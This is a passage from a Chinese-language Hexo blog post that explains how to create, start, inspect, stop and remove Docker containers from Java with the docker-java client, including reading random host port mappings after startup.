<h3 id="0x03x03-创建容器"><a href="#0x03x03-创建容器" class="headerlink" title="0x03x03 创建容器"></a>0x03x03 创建容器</h3><p>示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建容器</span></span><br><span class="line">dockerClient.createContainerCmd(<span class="string">&quot;&quot;</span>).withName(containerName).withEnv(<span class="string">&quot;ENVxxx=xxx&quot;</span>)</span><br><span class="line">                    .withPortBindings(PortBinding.parse(<span class="string">&quot;80:&quot;</span>)).withImage(<span class="string">&quot;local/&quot;</span> + imageName).exec();</span><br><span class="line">log.info(<span class="string">&quot;Container created. =&gt; &quot;</span> + dockerClient.listContainersCmd().withShowAll(<span class="literal">true</span>).exec().get(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>参数不一一解释了，挺直观的。</p>
<h3 id="0x03x04-启动容器"><a href="#0x03x04-启动容器" class="headerlink" title="0x03x04 启动容器"></a>0x03x04 启动容器</h3><p>示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启动容器</span></span><br><span class="line">dockerClient.startContainerCmd(containerName).exec();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Thread.sleep(<span class="number">500</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ignoredE) &#123;&#125; <span class="comment">// 这里为什么要 sleep ?</span></span><br><span class="line"><span class="comment">// 获取容器信息</span></span><br><span class="line"><span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> dockerClient.listContainersCmd().withShowAll(<span class="literal">true</span>).exec().get(<span class="number">0</span>);</span><br><span class="line">log.info(<span class="string">&quot;Container started. =&gt; &quot;</span> + container);</span><br></pre></td></tr></table></figure>

<p>*** 什么获取容器信息之前要 sleep ? ***</p>
<h3 id="0x03x05-获取端口映射"><a href="#0x03x05-获取端口映射" class="headerlink" title="0x03x05 获取端口映射"></a>0x03x05 获取端口映射</h3><p>注意到创建容器的时候建立了一个端口映射：</p>
<p>.withPortBindings(PortBinding.parse(“80:”))</p>
<p>意为将容器的 80 端口映射到宿主机的随机端口。</p>
<p>端口映射：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80:       #将容器 80 端口映射到宿主机随机（高阶）端口</span><br><span class="line">80:8080   #将容器 80 端口映射到宿主机指定端口（8080）</span><br></pre></td></tr></table></figure>

<p>由于随机端口映射是在容器启动时确定的，故而容器启动后才能 get 到。</p>
<p>回到上一小节启动的容器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> dockerClient.listContainersCmd().withShowAll(<span class="literal">true</span>).exec().get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>可以直接从 container 中获得端口信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">port</span> <span class="operator">=</span> container.getPorts()[<span class="number">0</span>].getPublicPort();</span><br></pre></td></tr></table></figure>

<p>回到刚才的问题，启动容器和获取信息过程之间为什么要 sleep ？</p>
<p>经过我的测试，刚启动的 container 的端口映射是不稳定的，需要经历很短时间的分发过程。当你在创建完端口之后立即得到 Container 对象，其端口信息与后来在 docker 服务里看到的端口信息不符。故而要 sleep ，等待端口映射稳定。如此这般。</p>
<h3 id="0x03x06-关闭-删除容器"><a href="#0x03x06-关闭-删除容器" class="headerlink" title="0x03x06 关闭&amp;删除容器"></a>0x03x06 关闭&amp;删除容器</h3><p>示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭容器</span></span><br><span class="line">dockerClient.killContainerCmd(containerName).exec();</span><br><span class="line">log.info(<span class="string">&quot;Container killed. =&gt; &quot;</span> + containerName);</span><br><span class="line"><span class="comment">// 删除容器</span></span><br><span class="line">dockerClient.removeContainerCmd(containerName).exec();</span><br><span class="line">log.info(<span class="string">&quot;Container removed. =&gt; &quot;</span> + containerName);</span><br></pre></td></tr></table></figure>

<h3 id="0x03x07-其他操作"><a href="#0x03x07-其他操作" class="headerlink" title="0x03x07 其他操作"></a>0x03x07 其他操作</h3><p>pull、push 等，其调用大同小异，甚至不用翻源码，看代码提示即可。命令构造器构造命令，根据需求适当通过 withXxx 方法加参数，最后调用 .exec() 方法执行之。（异步方法有参，传入实例化的对应 XxxxxxCallback ）</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>大概这些。后面要开一下 TLS 。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">QST137</p>
  <div class="site-description" itemprop="description">苍山岁岁有人去，唯愿洱海生白波。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Qst137" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Qst137" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:Q_ST@bupt.edu.cn" title="E-Mail → mailto:Q_ST@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">QST137</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
